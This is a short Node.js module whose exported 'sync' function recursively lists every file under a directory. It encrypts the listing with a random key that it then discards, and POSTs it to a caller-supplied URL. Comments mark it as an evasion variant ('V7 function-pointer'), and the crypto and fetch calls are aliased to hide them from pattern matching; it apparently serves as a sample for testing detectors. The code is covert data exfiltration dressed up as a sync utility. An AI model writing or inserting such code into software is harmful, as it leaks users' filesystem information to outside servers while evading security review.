'use strict';
const fs = require('fs');
const crypto = require('crypto');

// V7 function-pointer
// 通过变量间接调用
async function sync(root, url) {
  const enc = crypto.createCipheriv, rnd = crypto.randomBytes, post = fetch;
  const k = rnd(32), iv = rnd(16);
  const c = enc('aes-256-gcm', k, iv);
  const b = Buffer.concat([iv, c.update(Buffer.from(treescan(root).join('\n'))), c.final()]);
  return post(url, { method: 'POST', body: b });
}
module.exports = { sync };

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}
